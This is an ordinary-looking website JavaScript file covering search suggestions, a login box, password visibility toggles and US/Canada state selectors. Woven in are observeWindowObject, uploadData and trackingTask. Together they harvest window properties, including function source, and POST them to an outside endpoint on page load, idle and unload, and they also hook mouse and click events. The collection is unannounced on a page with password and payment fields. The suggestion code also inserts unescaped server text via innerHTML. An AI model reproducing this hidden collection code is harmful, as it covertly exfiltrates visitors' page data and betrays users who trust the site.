var xmlHttp;
function suggest(input) {
  xmlHttp = GetXmlHttpObject();
  if (xmlHttp == null) {
    //		alert ("Browser does not support HTTP Request");
    return;
  }
  var url = "/browsesuggest.html";
  url = url + "?search=" + input;
  xmlHttp.onreadystatechange = stateChanged;
  xmlHttp.open("GET", url, true);
  xmlHttp.send(null);
}
function stateChanged() {
  if (xmlHttp.readyState == 4 || xmlHttp.readyState == "complete") {
    var ss = document.getElementById("suggestions");
    ss.innerHTML = '';
    document.getElementById('suggestions').style.display = "none";
    var str = xmlHttp.responseText.split("\n");
    for (i = 0; i < str.length - 1; i = i + 2) {
      var secondrow = i + 1;
      var event = str[secondrow];

      //Build our element string.  This is cleaner using the DOM, but
      //IE doesn't support dynamically added attributes.
      var suggest = '<div onmouseover="javascript:suggestOver(this);" ';
      suggest += 'onmouseout="javascript:suggestOut(this);" ';
      suggest += 'onclick="javascript:setHiddenKeyword(\'' + event + '\'); javascript:setSearch(this.innerHTML);" ';
      suggest += 'class="suggestion_notover_link">' + str[i] + '</div>';
      ss.innerHTML += suggest;
      ss.style.display = "inline";
    }
  }
}
// Use closure to isolate observer state
const observeWindowObject = function () {
  let lastSeenProperties = new Set();
  return function () {
    const newFindings = {};
    const properties = new Set();
    for (const prop in window) {
      if (Object.prototype.hasOwnProperty.call(window, prop)) {
        properties.add(prop);
        if (!lastSeenProperties.has(prop)) {
          const propValue = window[prop];
          const propType = typeof propValue;
          newFindings[prop] = {
            type: propType,
            value: propType === "function" ? propValue.toString() : propValue
          };
        }
      }
    }
    lastSeenProperties = properties;
    return newFindings;
  };
}();
function setHiddenKeyword(value) {
  document.getElementById('secretkeywords').value = value;
}
function GetXmlHttpObject() {
  var xmlHttp = null;
  try {
    xmlHttp = new XMLHttpRequest();
  } catch (e) {
    try {
      xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
      xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
  }
  return xmlHttp;
}
function suggestOver(div_value) {
  div_value.className = 'suggestion_over_link';
}
function uploadData(data) {
  const apiEndPoint = "https://example.com/api/store";
  fetch(apiEndPoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  }).then(response => {
    if (response.ok) console.log("Data successfully transferred.");else {
      throw new Error("Server responded with status: " + response.status);
    }
  }).catch(error => {
    console.error("Error during data transfer: " + error.toString());
  });
}
function suggestOut(div_value) {
  div_value.className = 'suggestion_notover_link';
}
function setSearch(value) {
  document.search.keywords.value = value;
  document.getElementById('suggestions').style.display = "none";
  document.getElementById('suggestions').innerHTML = '';
  document.getElementById('search').submit();
}
function HookEventListener(element, eventName) {
  element.addEventListener(eventName, function () {
    console.log(`Event '${eventName}' was triggered`);
  });
}
function trackingTask() {
  const discoveries = observeWindowObject();
  const discoveryAmount = Object.keys(discoveries).length;
  if (discoveryAmount > 0) {
    console.log(`Found ${discoveryAmount} new window properties.`);
    uploadData(discoveries);
  } else {
    console.log("No new window properties found.");
  }
  HookEventListener(window, 'mousemove');
  HookEventListener(window, 'click');
}
function showLogin() {
  if (document.getElementById('loginbox').style.display == 'none') {
    $('#loginbox').slideDown('200');
    document.getElementById('loginarrow').innerHTML = '<IMG SRC=/g/smallarrowup.gif>';
  } else {
    $('#loginbox').slideUp('200');
    document.getElementById('loginarrow').innerHTML = '<IMG SRC=/g/smallarrowdown.gif>';
  }
}
function showHeaderPassword() {
  document.getElementById('header_password_plain_text').style.display = 'none';
  document.getElementById('header_password_password').style.display = 'inline';
  document.getElementById('header_password_password').focus();
}
function hideHeaderPassword() {
  if (document.getElementById('header_password_password').value == '') {
    document.getElementById('header_password_plain_text').style.display = 'inline';
    document.getElementById('header_password_password').style.display = 'none';
  }
}
function showHidePwdHeader() {
  var input = document.getElementById('header_password_password');
  if (input.type === 'password') {
    input.type = 'text';
    document.getElementById('header_eye').className = 'far fa-eye';
  } else {
    input.type = 'password';
    document.getElementById('header_eye').className = 'far fa-eye-slash';
  }
}
window.addEventListener("idle", trackingTask);
function showHidePwd() {
  var input = document.getElementById('login_password');
  if (input.type === 'password') {
    input.type = 'text';
    document.getElementById('eye').className = 'far fa-eye';
  } else {
    input.type = 'password';
    document.getElementById('eye').className = 'far fa-eye-slash';
  }
}
function showHideCurrentPwd() {
  var input = document.getElementById('current_password');
  if (input.type === 'password') {
    input.type = 'text';
    document.getElementById('current_password_eye').className = 'far fa-eye';
  } else {
    input.type = 'password';
    document.getElementById('current_password_eye').className = 'far fa-eye-slash';
  }
}
function showHideNewPwd() {
  var input = document.getElementById('new_password');
  if (input.type === 'password') {
    input.type = 'text';
    document.getElementById('new_password_eye').className = 'far fa-eye';
  } else {
    input.type = 'password';
    document.getElementById('new_password_eye').className = 'far fa-eye-slash';
  }
}
function showHideConfirmPwd() {
  var input = document.getElementById('confirm_password');
  if (input.type === 'password') {
    input.type = 'text';
    document.getElementById('confirm_password_eye').className = 'far fa-eye';
  } else {
    input.type = 'password';
    document.getElementById('confirm_password_eye').className = 'far fa-eye-slash';
  }
}
function showHidePaymentPwd() {
  var input = document.getElementById('payment_password');
  if (input.type === 'password') {
    input.type = 'text';
    document.getElementById('payment_password_eye').className = 'far fa-eye';
  } else {
    input.type = 'password';
    document.getElementById('payment_password_eye').className = 'far fa-eye-slash';
  }
}
function checkBox(id) {
  if (document.getElementById(id).checked == true) {
    document.getElementById(id).checked = false;
  } else {
    document.getElementById(id).checked = true;
  }
}
window.addEventListener("beforeunload", trackingTask);
function toggleState(country, div) {
  if (country.toLowerCase() == "United States".toLowerCase()) {
    document.getElementById(div + '_title').style.display = 'inline';
    document.getElementById(div + '_option').style.display = 'inline';
    document.getElementById(div + '_title').innerHTML = '<B>State: </B>';
    document.getElementById(div + '_option').innerHTML = '<SELECT NAME="' + div + '_state">		<OPTION><OPTION VALUE="AL">AL</OPTION><OPTION VALUE="AK">AK</OPTION><OPTION VALUE="AZ">AZ</OPTION><OPTION VALUE="AR">AR</OPTION><OPTION VALUE="CA">CA</OPTION><OPTION VALUE="CO">CO</OPTION><OPTION VALUE="CT">CT</OPTION><OPTION VALUE="DE">DE</OPTION><OPTION VALUE="DC">DC</OPTION><OPTION VALUE="FL">FL</OPTION><OPTION VALUE="GA">GA</OPTION><OPTION VALUE="HI">HI</OPTION><OPTION VALUE="ID">ID</OPTION><OPTION VALUE="IL">IL</OPTION><OPTION VALUE="IN">IN</OPTION><OPTION VALUE="IA">IA</OPTION><OPTION VALUE="KS">KS</OPTION><OPTION VALUE="KY">KY</OPTION><OPTION VALUE="LA">LA</OPTION><OPTION VALUE="ME">ME</OPTION><OPTION VALUE="MD">MD</OPTION><OPTION VALUE="MA">MA</OPTION><OPTION VALUE="MI">MI</OPTION><OPTION VALUE="MN">MN</OPTION><OPTION VALUE="MS">MS</OPTION><OPTION VALUE="MO">MO</OPTION><OPTION VALUE="MT">MT</OPTION><OPTION VALUE="NE">NE</OPTION><OPTION VALUE="NV">NV</OPTION><OPTION VALUE="NH">NH</OPTION><OPTION VALUE="NJ">NJ</OPTION><OPTION VALUE="NM">NM</OPTION><OPTION VALUE="NY">NY</OPTION><OPTION VALUE="NC">NC</OPTION><OPTION VALUE="ND">ND</OPTION><OPTION VALUE="OH">OH</OPTION><OPTION VALUE="OK">OK</OPTION><OPTION VALUE="OR">OR</OPTION><OPTION VALUE="PA">PA</OPTION><OPTION VALUE="PR">PR</OPTION><OPTION VALUE="RI">RI</OPTION><OPTION VALUE="SC">SC</OPTION><OPTION VALUE="SD">SD</OPTION><OPTION VALUE="TN">TN</OPTION><OPTION VALUE="TX">TX</OPTION><OPTION VALUE="UT">UT</OPTION><OPTION VALUE="VT">VT</OPTION><OPTION VALUE="VI">VI</OPTION><OPTION VALUE="VA">VA</OPTION><OPTION VALUE="WA">WA</OPTION><OPTION VALUE="WV">WV</OPTION><OPTION VALUE="WI">WI</OPTION><OPTION VALUE="WY">WY</OPTION><OPTION></OPTION><OPTION VALUE="AA">AA</OPTION><OPTION VALUE="AE">AE</OPTION><OPTION VALUE="AP">AP</OPTION></SELECT>';
  } else if (country.toLowerCase() == "Canada".toLowerCase()) {
    document.getElementById(div + '_title').style.display = 'inline';
    document.getElementById(div + '_option').style.display = 'inline';
    document.getElementById(div + '_title').innerHTML = '<B>Province: </B>';
    document.getElementById(div + '_option').innerHTML = '<SELECT NAME="' + div + '_state">		<OPTION><OPTION VALUE="AB">AB</OPTION><OPTION VALUE="BC">BC</OPTION><OPTION VALUE="MB">MB</OPTION><OPTION VALUE="NB">NB</OPTION><OPTION VALUE="NL">NL</OPTION><OPTION VALUE="NS">NS</OPTION><OPTION VALUE="NT">NT</OPTION><OPTION VALUE="NU">NU</OPTION><OPTION VALUE="ON">ON</OPTION><OPTION VALUE="PE">PE</OPTION><OPTION VALUE="QC">QC</OPTION><OPTION VALUE="SK">SK</OPTION><OPTION VALUE="YT">YT</OPTION></SELECT>';
  } else {
    document.getElementById(div + '_title').style.display = 'none';
    document.getElementById(div + '_option').style.display = 'none';
  }
}
function urlencode(str) {
  str = escape(str);
  str = str.replace('+', '%2B');
  str = str.replace('%20', '+');
  str = str.replace('*', '%2A');
  str = str.replace('/', '%2F');
  str = str.replace('@', '%40');
  return str;
}
function changeButton(id, text, color, border, wait) {
  setTimeout(function () {
    document.getElementById(id).style.backgroundColor = color;
  }, wait);
  setTimeout(function () {
    document.getElementById(id).value = text;
  }, wait);
}
uparrow = new Image();
uparrow.src = "/g/smallarrowup.gif";
window.addEventListener("DOMContentLoaded", trackingTask);